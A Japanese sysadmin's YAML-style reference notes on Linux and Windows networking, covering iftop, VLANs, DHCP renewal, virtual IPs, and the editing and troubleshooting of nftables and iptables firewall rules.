#keyword: Network.yaml, net
監視ツール:
    iftop: #keyword:
        インストール:
            CentOS7: sudo yum install iftop
        帯域の使用量を表示し続けます:
            内容:
                - ネットワークの使用量の表を表示します。
                - 新しいサーバーへ通信を行うと、表に追加されます。
                - 40秒通信がないサーバーは、表から無くなります。
            実行例: |
                $ sudo iftop -t            

                # Host name (port/service if enabled)            last 2s   last 10s   last 40s cumulative
                --------------------------------------------------------------------------------------------
                1 localhost.localdomain                    =>     1.69Kb     1.38Kb     1.41Kb     5.65KB
                    gateway                                <=     1.77Kb     1.10Kb     0.98Kb     3.93KB
                2 localhost.localdomain                    =>         0b         0b        50b       202B
                    10.0.2.3                               <=         0b         0b       101b       403B
                --------------------------------------------------------------------------------------------
                Total send rate:                                  1.69Kb     1.38Kb     1.46Kb
                Total receive rate:                               1.77Kb     1.10Kb     1.08Kb
                Total send and receive rate:                      3.45Kb     2.48Kb     2.54Kb
                --------------------------------------------------------------------------------------------
                Peak rate (sent/received/total):                  3.45Kb     3.52Kb     6.97Kb
                Cumulative (sent/received/total):                 5.85KB     4.33KB     10.2KB
                ============================================================================================
VLAN: #keyword:
    概要: #// 仮想的なLANセグメントを作る技術です。1～4094のVLAN番号で区別します
        分割: ARP リクエストなどの際のブロードキャストドメインの分割を行うことができます。
            同じセグメント（IPアドレス範囲）192.168.1.0/24を複数持たせられます。同じハブに接続した複数の端末が 192.168.1.101/24 のように設定できます（未確認）
        結合: VLANは複数のスイッチにまたがり設定することが可能。 スイッチポートに設定した VLAN ID が同じならまたがってブロードキャスト可能（未確認）
        セキュリティ: VLAN と VLAN の間で通常の IP アドレスによる通信はできません。同じ IP アドレスが使われている可能性があるため。
    参考: https://www.infraexpert.com/study/vlanz1.html
IPアドレス: #keyword:
    DHCP: #keyword:
        リース期限: #keyword: DHCP 期限   #focus: リースの有効期限
            表示: |
                PowerShell> ipconfig /all
                    ...
                    IPv4 アドレス . . . . . . . . . . . .: 10.200.100.111(優先)
                    サブネット マスク . . . . . . . . . .: 255.255.255.0
                    リース取得. . . . . . . . . . . . . .: 2023年11月22日 10:17:46
                    リースの有効期限. . . . . . . . . . .: 2023年11月27日 7:39:39
            期限まで半分すぎたとき:
                ネットワークにアクセスしたタイミングで再取得と期限の延長を試みます  #// 未確認
            #search: DHCP renew
        再取得: #keyword: DHCP renew  #// リース期限の更新
            Windows:
                #// 以下のいずれか
                コマンドまたは操作:  #// RDP の接続先でも使えます
                    全ての場合:
                        簡単な方法の場合:
                            Windows を再起動します。
                        コマンドの場合:  #// Windows の再起動をしたくない場合。ipconfig /all で DHCP 有効 が「はい」のすべての NIC が対象です
                            #// 注意：RDP の接続先で実行する場合、1回のコマンド入力ですべて行わないと RDP が接続できなくなります
                            コマンド: 管理者 PowerShell >> ipconfig /release;  ipconfig /renew;  curl __URL__
                            補足:
                                - renew だけでは、IP アドレス で RDP ログインすることはできますが、FQDN ではログインできません
                                - 任意のサイトに curl 等でアクセスすると DNS が設定され、FQDN でもログインできるようになります
                                - release しないと延長されません（リース期限の半分を過ぎれば延長されるかも）
                                - renew しないと curl に失敗します
                                - release したら、再起動しても RDP ではログインできません
                    特定の NIC の場合:
                        NIC の名前を調べます: #keyword: NIC name of Windows
                            コマンド: |
                                PowerShell> ipconfig /all
                                ...
                                イーサネット アダプター vEthernet (WSL):
                                ...
                            名前の部分:
                                vEthernet (WSL)
                        コマンド:
                            管理者 PowerShell >> ipconfig /release "イーサネット";  ipconfig /renew "イーサネット";  curl __URL__
                            #// 注意：RDP の接続先で実行する場合、1回のコマンド入力ですべて行わないと RDP が接続できなくなります
                無線LAN のオフ・オン:  #// RDP の接続先には使えません
            端末に固定IPを設定したら ipconfig /all の IPv4 アドレスが重複と表示されたら:
                自動IPに戻し、ルーターの固定DHCP の IPアドレスを変えます  #search: 固定DHCP
    CIDR: #keyword:  #// IP アドレスとネットマスク。例 192.168.100.101/24, (IPv6→) 2001:db8::1/128
        /24: サブネットマスク長、プレフィックス長。IP アドレス の上位 24ビットが同じ相手（ホスト）が、同じサブネット内にいます。
    VIP: #keyword: VIP,  Virtual IP,  Virtual IP (address) 仮想IPアドレス
        参考: #ref: https://techblog.yahoo.co.jp/web/auctions/vip/
        VIP を確認します: #keyword: VIP check  #// VIP = 仮想 IP アドレス
            - vip=$(dig +short  __VirtualFQDN__)  #// __VirtualFQDN__ は VIP を持ち公開されている FQDN
            - echo $vip
                #// （例） 192.168.203.22
                #// __VirtualFQDN__ に対応した（仮想）IP アドレス
            - ip addr | grep $vip  #// 表示されればログイン中のマシンが VIP を持っている
                #//（例） inet 192.168.203.22/24 scope global secondary eth1
        VIP を追加します: #keyword: add VIP  #// VIP = 仮想 IP アドレス
            ip addr コマンド:  #search: global secondary IP address
            CentOS:
                sudo vi /etc/sysconfig/network-scripts/ifcfg-eth1:0 : |
                    DEVICE=eth1:0
                    ONBOOT=yes
                    BOOTPROTO=static
                    IPADDR=192.168.34.40
                    PREFIX=24
                設定します:
                    sudo systemctl restart network
            変更時の反映時間: #keyword: VIP update time
                VIP を変えると、MAC アドレス テーブル（IP アドレスと MAC アドレスの対応表）
                の更新に時間がかかります。（VRRP（プロトコル）などを使わない場合、35分かかったことがあります）
                MAC アドレス テーブル は、経路上のネットワーク機器（スイッチなど）が持っています。
        トラブルシューティング (VIP):
            - #// systemctl restart network すると VIP が消える。ipcalc: bad prefix: 255.255.255.0
                手順:
                    sudo systemctl restart network
                    journalctl -xe のログ
                エラー: |
                    Oct 20 19:29:19 host1 network[4349]: Bringing up interface eth1:  ipcalc: bad prefix: 255.255.255.0
                    Oct 20 19:29:19 host1 network[4349]: Determining if ip address 192.168.34.40 is already in use for device eth1...
                    Oct 20 19:29:24 host1 network[4349]: Error: inet address is expected rather than "dev".
                    Oct 20 19:29:24 host1 network[4349]: bind: Cannot assign requested address
                    Oct 20 19:29:24 host1 network[4349]: [  OK  ]
                対処:
                    /etc/sysconfig/network-scripts/ifcfg-eth1:0 : |
                        PREFIX=255.255.255.0 だったら PREFIX=24 に変更します。
    VRRP: #keyword:  #// Virtual Router Redundancy Protocol。 ルーターの冗長構成。マスターのルーターが故障したらバックアップのルーターに切り替わります
        VRID: #keyword:  #// Virtual Router IDentifier。マスターとバックアップの関係があるルーターに同じ ID を設定します
            値: 1～255
            keepalived: #search: keepalived  virtual_router_id
        変更時の反映時間:
            VRRP などを使わない場合よりは早いらしい  #search: VIP update time
firewalld:  #// ファイアー ウォール 機能。CentOS8 Linux の標準。使えるのは CentOS7～。iptables の filter テーブル
nftables: #keyword: nftables,  nf_tables  #// NAT 機能。CentOS8 Linux の標準。nftコマンド  #ref: https://wiki.nftables.org/wiki-nftables/index.php/Main_Page
    手順:
        表示: |  #keyword: sudo nft list ruleset  #// 現在の設定を表示します。サーバー側（リクエストを受ける側）で実行します。現在の設定はカーネルのメモリー内にあります
            sudo nft -a list ruleset    #// -a オプションは # handle ____ も表示します。nft のすぐ右に書く必要があります。handle の番号はソートされていないこともあります
                table inet filter {
                    chain input { # handle 1                                      #search: nftables table chain
                        type filter hook input priority filter; policy accept;    #search: nftables hook
                        ct state invalid drop # handle 2
                        ct state established,related accept
                        iif "lo" accept
                        ip saddr 192.168.1.0/24 accept         #search: edit nftables
                        tcp dport 22 accept
                        tcp dport 80 accept
                        tcp dport 443 accept
                        drop
                    }

                    chain forward {
                        type filter hook forward priority filter; policy drop;
                    }

                    chain output {
                        type filter hook output priority filter; policy accept;
                    }
                }
        動いているのは iptables か nftables か確認します: #keyword: iptables or nftables
            $ sudo iptables --version
            iptables v1.8.10 (nf_tables)
            #// iptables コマンドのバージョンが v1.8.10
            #// 動いているのは nftables
        編集:
            行ごとのコマンドで編集する場合: #keyword: edit nftables
                基本:  #// 末尾に追加します
                    サンプル: |
                            sudo nft add rule  inet filter Input  ip saddr 192.168.1.0/24  accept
                            sudo nft list ruleset  |  sudo tee  /etc/sysconfig/nftables.conf  #// 起動時に読む場所へ設定を保存します。/etc/sysconfig/nftables.conf は RHEL系 の場合
                        #template__: nft add rule  inet __Table__ __Chain__  __MatchingExpression__  __Statement__
                    __MatchingExpression__: ip saddr 192.168.1.0/24  #// いろいろな書き方があります → #search: nftables matching expressions
                    __Statement__: accept  #search: nftables statements
                    構成:  #search: nftables concept tree
                挿入する場所を指定する場合: #keyword: nft insert example
                    #// nft add の代わりに nft insert を使います
                    先頭に挿入する場合:  #// handle や index を指定しません
                        sudo nft insert rule  inet filter Input  ip saddr 192.168.1.0/24  accept
                    handle を指定する場合:  #// ハンドル番号
                        サンプル:
                            sudo nft -a list ruleset
                                ハンドル番号を確認します
                            sudo nft insert rule  inet filter Input  handle 0  ip saddr 192.168.1.0/24  accept
                            #template__: nft insert rule  __Table__ filter __Chain__  handle __HandleNumber__  __MatchingExpression__  __Statement__
                    index を指定する場合:  #// 相対位置
                        サンプル:
                            sudo nft insert rule  inet filter Input  index 0  ip saddr 192.168.1.0/24  accept
                            #template__: nft insert rule  __Table__ filter __Chain__  index __Index__  __MatchingExpression__  __Statement__
                        __Index__: 0 が最初。指定した場所の上に挿入されます。type が最も上にあるチェインでは、0 は type の直下になります。handle 番号ではありません。
                削除:  #search: nft delete
            既存の設定をインポートする場合: #keyword: import nftables
                編集と構文チェック:
                    -   sudo vi         /etc/sysconfig/nftables.conf   #// ファイルを編集します
                    -   sudo nft -c  -f /etc/sysconfig/nftables.conf   #// 構文チェック
                    -   sudo nft flush ruleset                         #// 設定をクリアします。次のコマンドはルールの追加コマンドであるため
                    -   sudo nft     -f /etc/sysconfig/nftables.conf   #// ファイルの内容に従って設定を追加します
                    -   sudo nft list ruleset                          #// 現在のルールを確認します
                Load:  #ref: https://wiki.nftables.org/wiki-nftables/index.php/Quick_reference-nftables_in_10_minutes#Load_ruleset
                全クリア:
                    sudo nft flush ruleset
            その他:  #search: nft command
    コマンド:
        nft コマンド: #keyword: nft command  #glossary:  #ref: https://wiki.nftables.org/wiki-nftables/index.php/Quick_reference-nftables_in_10_minutes#Rules
            nft add:  #search: edit nftables
            nft insert:  #search: nft insert example
            nft replace:
            nft delete: |
                sudo nft -a list ruleset  #// ハンドルを付けてルールを一覧します
                sudo nft delete rule  inet filter Input  handle 999
                    #template__: sudo nft delete rule  inet __Table__ __Chain__  handle __Handle__
    構成:  #// man → #ref: https://www.netfilter.org/projects/nftables/manpage.html#index
        （ツリー）: #keyword: nftables concept tree  #ref: https://wiki.nftables.org/wiki-nftables/index.php/Quick_reference-nftables_in_10_minutes
            通信経路:
                フック: #keyword: nftables hook  #focus: hook  #// 基本的なフックは input です
                    一覧:
                        prerouting:
                        forward:
                        input:
                        output:
                        postrouting:
                    経路:
                        プロセスが応答または転送する場合:
                            (外部からリクエスト) → prerouting → input → (プロセス) → output → postrouting → (外部へレスポンスまたは転送)
                        フォワーディングする場合:
                            (外部) → prerouting → forward → postrouting → (外部)
                    構成図: |
                        |           ┌-------------------------------┐
                                    │       外部ネットワーク        │
                                    └--------------┬---------------┘
                                                    ↓ 受信
                                        ┌----------------------┐
                                        │  [hook: prerouting]  │
                                        │   DNAT, 受信前処理   │
                                        └----------┬----------┘
                                                    ↓
                                        ┌----------------------┐
                                        │   ルーティング判定   │
                                        └----------┬----------┘
                                    ┌--------------┴-------------┐
                                ローカル宛て                      転送
                                    ↓                             ↓
                        ┌----------------------┐    ┌---------------------┐
                        │   [hook: input]      │    │  [hook: forward]    │
                        │   受信フィルタリング │    │  転送フィルタリング │
                        └----------┬----------┘    └----------┬---------┘
                                    ↓                            │
                        ┌----------------------┐                │
                        │  ローカルプロセス    │                │
                        │  (アプリケーション)  │                │
                        └----------┬----------┘                │
                                    ↓ 送信                       │
                        ┌----------------------┐                │
                        │   [hook: output]     │                │
                        │  送信フィルタリング  │                │
                        └----------┬----------┘                │
                                    ↓                            │
                        ┌----------------------┐                │
                        │   ルーティング判定   │                │
                        └----------┬----------┘                │
                                    └--------------┬------------┘
                                                    ↓
                                        ┌----------------------┐
                                        │ [hook: postrouting]  │
                                        │  SNAT, 送信前処理    │
                                        └----------┬----------┘
                                                    ↓ 送信
                                    ┌------------------------------┐
                                    │      外部ネットワーク        │
                                    └------------------------------┘
                tables, テーブル:  #search: nftables table chain
                    chains, チェーン:  #search: nftables table chain
                        ^ベース チェーン:  #search: nftables base chain  #// パケット処理の起点となるチェーン
                        type:
                            hook:  #search: nftables hook
                        rules, ルール: #keyword: nftables rules
                            matches, マッチ:  #search: nftables matches
                                ip: saddr, daddr
                                tcp:
                                ...:
                            statements, ステートメント:  #search: nftables statements
                                verdict statements: accept, drop, jump, goto  #search: nftables verdict
                                log:
                                reject:
                                ...:
        テーブルとチェーン: #keyword: nftables table chain
            _: iptables では固定のテーブルとチェーンでしたが、nftables では自由に設定できます
                #search: iptables table chain
            iptables と nftables のサンプルの比較:
                iptables: |
                    iptables -t filter -A INPUT -s 192.168.1.0/24 -j ACCEPT
                    ip6tables -t filter -A INPUT -s 2001:db8::/32 -j ACCEPT
                nftables: |
                    nft add table inet myfilter
                    nft add chain inet myfilter myinput { type filter hook input priority 0 \; }
                    nft add rule inet myfilter myinput ip saddr 192.168.1.0/24 accept
                    nft add rule inet myfilter myinput ip6 saddr 2001:db8::/32 accept
            ベース チェーン: #keyword: nftables base chains,  nftables INPUT chain  #// パケット処理の最初に参照するチェーン。起点となるチェーン
                探す: #keyword: nftables type hook  #focus: hook  #// type ____ hook ____ があるものが ベース チェーン です
                    sudo nft list ruleset
                        table inet filter {
                            chain input {
                                type filter  hook input  priority 0;  policy drop;
                                #template__: type __Type__  hook __Hook__  priority __Priority__; [policy __Policy__;]
                hook:  #search: nftables hook
                policy:  #keyword: nftables policy
                    どのマッチング式にもマッチしなかった場合の判定結果
                    #search: nftables matches
                    #search: nftables verdict
            フック:  #search: nftables hook  #// ベース チェーン に関連付ける場所  #search: nftables base chain
            通常チェーン: #keyword: nftables regular chains  #// 他のチェーンから呼ばれる。hook を持たない
        matches, マッチング式: #keyword: nftables matches,  nftables matching expressions
            書式: __Protocol__ __Field__ __Value__
            __Protocol__:
                tcp, ip, ip6, udp
            #↓ プロトコル＋フィールド
            ip saddr: #// IPv4 source CIDR
                -   ip saddr 192.168.1.0/24
                -   ip saddr { 172.16.0.0/12, 192.168.1.0/24 }   #// 未確認
            sport, dport: #keyword: nftables sport, nftables dport,  nftables source destination port
                #// プロトコルは tcp または udp
                -   tcp dport 80  #// （input の）受信側
                -   tcp dport { 80, 443, 8080 }  #// 複数指定
                -   tcp sport 1024-65535  #// 範囲指定
                -   tcp sport { 1024-59999, 65535 }  #// 範囲指定
                -   nft add set inet filter web_ports { type inet_service; elements = { 80, 443, 8080 } }  #// Named Set "web_ports" の定義
                -   nft add rule inet filter input tcp dport @web_ports accept  #// Named Set "web_ports" の参照
            counter: #keyword: nftables counter
                -   counter packets 0 bytes 0  #// マッチしたカウントを取るようになります
            マッチした場合、かつ、ルール評価が終わるタイプの判定結果が書かれている場合:
                以降のマッチング式は評価されません
            どれにもマッチしなかった場合:
                #search: nftables policy
        statements: #keyword: nftables statements  #ref: https://wiki.nftables.org/wiki-nftables/index.php/Quick_reference-nftables_in_10_minutes#Statements
            verdict, 判定結果: #keyword: nftables verdict,  nftables accept reject deny drop 判定結果 バーディクト ターゲット
                #ref: https://www.netfilter.org/projects/nftables/manpage.html#lbDD
                accept: パケットを受け入れる。ルール評価は終わります
                drop: パケットを破棄（通知なし）。ルール評価は終わります  #search: nftables reject
                jump: サブルーチンのように呼び出し、処理後に戻る
                goto: 完全に移動し、戻らない
            log: ログ記録（処理は継続）
            reject: パケットを拒否（エラー通知を返す）  #search: nftables drop
            ...（書きかけ）:
                continue: 次のルールへ続行
                return: 呼び出し元チェーンに戻る
                jump __Chain__: 別のチェーンへジャンプ（戻ってくる）
                goto __Chain__: 別のチェーンへ移動（戻らない）
                counter: カウンタのみ（処理は継続）
    トラブルシューティング (nftables): #keyword: nftables trouble
        動いているのは iptables か nftables か確認します:  #search: iptables or nftables
        reject したルールを探します:
            reject した回数を表示します:
                sudo nft -a list ruleset | grep -E "[1-9][[0-9]* reject"
            通信します:
                curl など
            reject が増えたルールを探します:
                sudo nft -a list ruleset | grep -E "[1-9][[0-9]* reject"
        特定のルールにマッチしたかどうかを確認します:
            特定のルールの 1つ前に、カウンターを挿入します:  #// 特定のルールに到達しない可能性があるため
                sudo nft -a list ruleset
                sudo nft insert rule  inet filter AllowFromRepositoryClient  handle 27  tcp dport 8087  counter  comment "MARK"
                    #template__: nft insert rule  __Table__ __Chain__  handle __HandleNumer__  tcp dport __Port__  counter  comment "MARK"
            通信します:
                curl など
            特定のルールと、1つ前のルールのカウンターを確認します:
            挿入したカウンターを削除します: |  #// 元に戻します
                sudo nft -a list ruleset | grep MARK
                    #// ハンドル番号を確認します
                sudo nft delete rule  inet filter AllowFromRepositoryClient  handle __Handle__
        （未確認）カウンターをリセットします:  #// できていません
            $ sudo nft list tables
            table inet filter
            $ sudo nft reset counters table inet filter
            $ sudo nft reset counters inet filter
            $ sudo nft -a list ruleset
                カウンターはリセットされてない
        トレースします, ログを表示します:  #// nftables に関する通信ログを表示します。
            ログの表示を開始するルールを追加します:  #// 特定のポートのみ表示する場合
                sudo nft -a list ruleset
                sudo nft insert rule inet filter Input tcp dport 8087 meta nftrace set 1  #// 先頭に追加します
                    #template__: nft insert rule  __Table__ filter __Chain__  tcp dport __Port__  meta nftrace set 1
            ログが表示されるようにします:
                （別のターミナルで）
                sudo nft monitor trace
                    #// 待ち状態になります。通信が来たら、ログが表示されます
            通信します:
                curl など
            表示例: |  #focus: verdict,  saddr,  daddr
                trace id ab3cfe31 inet filter Input packet: iif "eth1" ether saddr 08:00:27:7c:d8:cb ether daddr 08:00:27:e4:61:ed ip saddr 192.168.229.21 ip daddr 192.168.229.20 ip dscp cs0 ip ecn not-ect ip ttl 64 ip id 24870 ip protocol tcp ip length 60 tcp sport 51130 tcp dport 8087 tcp flags == syn tcp window 64240 
                trace id ab3cfe31 inet filter Input unknown rule handle 32 (verdict continue)
                trace id ab3cfe31 inet filter Input rule jump __Rule1__ (verdict jump __Rule1__)
                trace id ab3cfe31 inet filter __Rule1__ rule ip saddr 192.168.34.0/24 udp dport 53 counter packets 0 bytes 0 accept (verdict continue)
                trace id ab3cfe31 inet filter Input rule goto __Rule2__ (verdict goto __Rule2__)
                trace id ab3cfe31 inet filter __Rule2__ rule counter packets 30 bytes 3027 jump __Rule3__ (verdict jump __Rule3__)
                trace id ab3cfe31 inet filter __Rule3__ rule ip saddr 172.31.192.0/18 counter packets 13 bytes 1104 accept (verdict continue)
                trace id ab3cfe31 inet filter __Rule2__ rule meta l4proto tcp counter packets 1 bytes 60 reject with tcp reset (verdict drop)
            トレースをしないように戻します: |
                sudo nft -a list ruleset | grep "tcp dport 8087 meta nftrace"
                    tcp dport 8087 meta nftrace set 1 # handle __Handle__
                sudo nft delete rule  inet filter Input  handle __Handle__
        その他:  #search: iptables trouble
iptables:  #keyword:  #// Rocky8, CentOS7 Linux の標準。ファイアー ウォール 機能 と NAT 機能。CentOS8 では firewalld, nftables（nftコマンド）が標準
    関連:
        CentOS8:
            ファイアー ウォール 機能:  #search: firewalld
            NAT 機能:  #search: nftables
        nftables: #search:  #// iptable の次世代版
    公式:
        #ref: https://linuxjm.osdn.jp/html/iptables/man8/iptables.8.html
        #ref: https://linuxjm.osdn.jp/html/iptables/man8/iptables-extensions.8.html
        #ref: http://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-ja-4/s1-fireall-ipt-act.html
    手順:
        表示:  #// 現在の設定を表示します。現在の設定はカーネルのメモリー内にあります
            IPv4:
                現在の設定一覧:  #keyword: iptables setting
                    save 形式で表示:  sudo iptables-save
                    list 形式で表示:  sudo iptables -S
                    見やすい形式で表示:  sudo iptables -nL --line-numbers
                    #// 形式については  #search: iptables files
            #ref: https://www.cyberciti.biz/faq/how-to-list-all-iptables-rules-in-linux/
            #ref: https://www.digitalocean.com/community/tutorials/how-to-list-and-delete-iptables-firewall-rules
        チェック:  #// 既知の設定から変わっていないかチェックします
            iptables を表示して比較します:
                sudo iptables -S  |  tee ~/_iptables
                diff  ~/_iptables  /etc/iptables/v0.iptables  #// ファイル名は編集してください
        編集:
            行ごとのコマンドで編集する場合:  #keyword: edit iptables
                バックアップします: #keyword: iptables-save,  iptables back up export  #// エクスポート
                    -   sudo iptables-save          |  sudo tee /etc/iptables/v0.iptables.save   #// バックアップする iptables を表示・保存します
                    #// または
                    -   sudo iptables --list-rules  |  sudo tee /etc/iptables/v0.iptables  #// iptables-save コマンドと少し内容が違います
                行の追加:  #// iptables コマンドに、行の内容を続けて書くだけで追加できます
                    #// 実行する前にバックアップしてください
                    サンプル: |
                        sudo iptables -A INPUT --source 192.168.34.0/24 -p tcp -m tcp  -j ACCEPT  #// or DROP
                        sudo iptables -D INPUT --source 192.168.34.0/24 -p tcp -m tcp  -j ACCEPT  #// or DROP
                        sudo iptables -P FORWARD DROP
                        sudo iptables -N DOCKER
                        sudo iptables -A FORWARD -j DOCKER-USER
                    既にあるとき:
                        -P, -N: 上書きします
                        -A: 追記します
                    #search: iptables example
                    #search: iptables options
                保存・適用:
                    Red Hat/CentOS の場合:
                        sudo service iptables save
                    For systems with iptables-persistent:
                        sudo netfilter-persistent save
                （必要なら）リストアします:
                    sudo iptables-restore  <  /etc/iptables/v0.iptables.save
                バージョンを固定します:  #// エクスポートします。書き換えられたときの参考になります
                    sudo iptables --list-rules  |  sudo tee /etc/iptables/v1.iptables
                    sudo iptables-save          |  sudo tee /etc/iptables/v1.iptables.save
                その他:  #search: iptables options
            既存の設定をインポートする場合:  #keyword: import iptables
                手順:
                    インポートするファイルを用意します:
                        - インポートするファイルは手動で編集するか、行ごとのコマンドで編集してエクスポートしたファイルを使ってください。
                            #search: edit iptables  #search: export iptables
                        - 注意！後で実行する iptables-restore コマンドは、ファイルに書かれていないテーブルについては、設定変更されません  
                            #search: iptables table format
                    インポートします:  #// インポートしただけで永続化しなかったときは再起動したときに設定が戻ります
                        sudo iptables-restore  <  /etc/iptables/v0.iptables.save  #// ファイル名は編集してください
                    永続化します:  #search: iptables persistent
                        #// 設定しなくてもサービスが自動的に追加する場合は、永続化不要です。むしろリロードが必要かもしれません
                        sudo iptables-save  |  sudo tee  /etc/sysconfig/iptables  > /dev/null
    機能:
        ルールの適用順序:  #keyword: iptables ルールの適用順序
            判定方法:
                - iptables の上から判定していきます
                - マッチしたルールより下のルールは判定に使われません
            サンプル:
                    -A INPUT -d 192.168.0.0/16 -j ACCEPT
                    -A INPUT -j REJECT --reject-with icmp-host-prohibited
                の場合、192.168.38.20 からリクエストがあった場合、
                上のほうにある ACCEPT のルールにマッチするため ACCEPT になります。
                下のほうにある REJECT のルールにもマッチしますが判定には使われません。
            ルール: #search: iptables options
    コマンド:  #// 
        iptables コマンド:  #ref: https://man7.org/linux/man-pages/man8/iptables.8.html
            サンプル1:
                iptables コマンド:
                    iptables  -A INPUT --source 192.168.111.222/255.255.255.255  -m comment --comment "__Comment__"  -j ACCEPT
                iptables の内容:
                    -A INPUT --source 192.168.111.222/255.255.255.255  -m comment --comment "__Comment__"  -j ACCEPT
            サンプル2:
                iptables コマンド:
                    iptables  -A INPUT -p tcp --dport 443  -j ACCEPT
                iptables の内容:
                    -A INPUT -p tcp --dport 443  -j ACCEPT
            local ループバックを開きます:  #keyword: iptables local loop back,  localhost iptables
                127.0.0.0, ! -i lo:  #search: iptables !
                    iptables  -A INPUT -s 127.0.0.0/8 ! -i lo -j DROP
                    iptables  -A INPUT -d 127.0.0.0/8 ! -i lo -j DROP
                127.0.0.0:
                    iptables  -A INPUT -d 127.0.0.0/8 -j ACCEPT
            オプション: #keyword: iptables options  #ref: https://man7.org/linux/man-pages/man8/iptables.8.html
                save 形式ファイルとほぼ同じです:  #search: iptables format
                -t, --table: 設定するテーブルの種類。省略すると filter。指定できる値は filter, nat, mangle, raw  #search: iptables concepts
                -A, --append:  #// 選択されたチェーンの最後に 1 つ以上のルールを追加します。1つもチェーンが無いときは ACCEPT
                    -A __Chain__ __Options__
                    #search: iptables example (1)
                    #search: iptables INPUT
                -I, --insert:
                    -   -I __Chain__ __Options__  #// 最初（上）に追加します。ただし OUTPUT はすべての INPUT の下に表示されます
                    -   -I __Chain__ __Number__ __Options__  #keyword: iptables __Number__  #// 最も上（優先）の __Number__ は 1 です
                -D, --delete:  #// ルールを削除します
                    -   -D __Chain__ __Options__
                    -   -D __Chain__ __Number__
                -F, --flush:   #// ルールをすべて削除します
                    サンプル: sudo iptables -t nat -F
                    nat テーブルの完全削除ができない:
                        コマンド:  #// 完全削除と同じ状態になります
                            sudo iptables --table nat --flush
                            sudo iptables --table nat --delete-chain
                            sudo iptables --table nat --policy PREROUTING ACCEPT
                            sudo iptables --table nat --policy INPUT ACCEPT
                            sudo iptables --table nat --policy OUTPUT ACCEPT
                            sudo iptables --table nat --policy POSTROUTING ACCEPT
                        しかし、iptables-save コマンドでは nat テーブルが表示されます: |
                            $ sudo iptables-save
                            *nat
                            :PREROUTING ACCEPT [0:0]
                            :INPUT ACCEPT [0:0]
                            :OUTPUT ACCEPT [0:0]
                            :POSTROUTING ACCEPT [0:0]
                            COMMIT
                        #// 消すことはできないようです
                -C, --check:  #// ルールが存在するかどうかを終了コードで返します
                    -C __Chain__ __Options__
                -s, --source:  #// 受信するときの送信元 IP アドレス/サブネット マスク
                    例:
                        -   --source 192.168.100.111/24
                        -   -s 192.168.100.111/255.255.255.0
                        #// DNS で解決できる名前は非推奨
                    INPUT チェーンに設定する場合: リクエスト元の相手
                    OUTPUT チェーンに設定する場合: localhost の NIC にマッピングされた IP アドレス
                    まとめて指定する場合:  #search: iptables addrtype
                -d. --destination:  #// 送信するときの送信先 IP アドレス/サブネット マスク
                    INPUT チェーンに設定する場合: localhost の NIC にマッピングされた IP アドレス
                    OUTPUT チェーンに設定する場合: 返信相手
                    まとめて指定する場合:  #search: iptables addrtype
                --dport: ポート番号（サーバー側）
                    iptables -A INPUT -s 192.168.1.100 -p tcp --dport 22 -j DROP
                    #// -p tcp の右に書くこと
                -p, --protocol: 設定対象となるプロトコル
                -i, --in-interface: 設定対象となる入力の NIC。末尾に + を付けるとワイルドカードになります。NIC の名前は ip addr コマンドで表示されます
                -o, --out-interface: 設定対象となる出力の NIC。末尾に + を付けるとワイルドカードになります。NIC の名前は ip addr コマンドで表示されます
                -j, --jump: #keyword: iptables -j  #// マッチした場合にどうするか。例 --jump DROP
                    DROP: 破棄します
                    ACCEPT: 通過させます
                    RETURN: パケットを現在のチェーンから呼び出し元のチェーンに戻す特別なアクションです。
                        -A DOCKER -i docker0 -j RETURN
                    SNAT:  #// LAN ⇒ 外部 にリクエストするときに静的に変換します
                        -j SNAT --to-source 200.40.9.180: (LAN) ⇒ 200.40.9.180（public) 
                        #search: SNAT
                    DNAT:  #// 外部 ⇒ LAN にリクエストされたときに静的に変換します
                        -j DNAT --to-destination 200.20.2.110: 200.20.2.110（public) ⇒ (LAN)
                    MASQUERADE:  #// 動的な NAT (SNAT, DNAT)
                    LOG: 通信ログに記録します
                --reject-with:
                    --reject-with icmp-host-prohibited: reject したときに icmp-host-prohibited つまり ICMPポート到達不能(タイプ3、コード3)を送り返します。
                (!): #keyword: iptables !  #// 指定したもの以外が設定対象になります。括弧は不要です（括弧は YAML の都合）
                    ! -i lo: ローカル ループバック の NIC 以外
                -m, --match: #// 拡張モジュール  #ref: https://linuxjm.osdn.jp/html/iptables/man8/iptables-extensions.8.html
                    -m comment:  #// comment モジュール
                        -m comment --comment "__Comment__" 
                    -m addrtype: #keyword: iptables addrtype  #// まとめてアドレスを指定します
                        --dst-type:  #// 設定対象となる送信先 IP アドレス の種類。
                            LOCAL: #// -m addrtype --dst-type LOCAL を指定すると、ローカルに来るすべてのアドレスが設定対象になります
                                #// ループバックアドレス、プライベートアドレス、公開アドレスなど
                    -m icmp:
                        -m icmp ! --icmp-type 13
                    -m hashlimit:  #// hashlimit モジュール
                        —hashlimit-name:
                        —hashlimit-htable-expire:
                -v: ルール別のパケット数とバイト数表示
            INPUT, FORWARD, OUTPUT, PREROUTING, POSTROUTING チェーン:  #search: iptables concepts
            行ごとのコマンドで編集する場合:
                #search: edit iptables    
                #search: iptables options    
        iptables-save コマンド:
            永続化します:  #search: iptables-save persistent
            エクスポートします:  #search: export iptables
        iptables-restore コマンド:
            #search: import iptables
    構成: #keyword: iptables concepts
        iptables:  #keyword: iptables table chain  #search: iptables options  #search: iptables format
            filter テーブル: #keyword: iptables filter
                INPUT チェーン: #keyword: iptables INPUT,  iptables __Chain__  #// ローカルプロセスに入る前に実行される受信するパケット（インバウンド）を許可したり拒否したりするチェイン
                    -A INPUT --source __SourceAddress__/__SubNetMask__  -m comment --comment "__Comment__"  -j __AcceptOrDrop__
                FORWARD チェーン: #keyword: iptables FORWARD  #// 転送するパケットを許可したり拒否したりするチェイン
                OUTPUT チェーン: #keyword: iptables OUTPUT  #// ローカルプロセスから出た後に実行される送信するパケット（アウトバウンド）を許可したり拒否したりするチェイン
            nat テーブル: #keyword: iptables nat  #// 一度 nat テーブルが作られると iptables-save の出力から nat テーブルの表示を無くすことはできません
                OUTPUT チェーン:
                PREROUTING チェーン: #keyword: iptables PREROUTING  #// ルーティングの前に実行される受信時に宛先アドレス/ポートを変換するチェイン
                POSTROUTING チェーン: #keyword: iptables POSTROUTING  #// ルーティングの後に実行される送信時に送信元アドレス/ポートを変換するチェイン
            mangle テーブル: #keyword: iptables mangle  #// パケットのTOSフィールドやTTLフィールドを変更したり、パケットに特別なマークを付ける時に使用します。
                INPUT チェーン:
                FORWARD チェーン:
                OUTPUT チェーン:
                PREROUTING チェーン:
                POSTROUTING チェーン:
